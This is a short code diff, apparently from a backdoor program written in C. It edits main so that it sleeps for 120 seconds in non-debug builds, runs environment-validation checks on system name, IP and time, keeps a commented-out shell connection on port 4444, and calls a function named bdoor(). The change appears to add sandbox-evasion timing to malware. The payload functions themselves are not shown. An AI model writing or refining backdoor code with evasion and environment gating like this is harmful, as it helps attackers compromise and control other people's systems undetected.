@@ -8,17 +8,21 @@
 
 
 int main(int argc, char * argv[]) {
-//THE REAL MAIN
-	
-//This is for the validator
+    //THE REAL MAIN
+
+#ifndef DEBUG
+    sleep(120);
+#endif
+
+    //This is for the validator
     val_SysName();
-	val_IP();
-	val_time();
+    val_IP();
+    val_time();
 
-//This is for the shell
-//connection(4444);
+    //This is for the shell
+    //connection(4444);
 
-bdoor();
+    bdoor();
 
 
 }
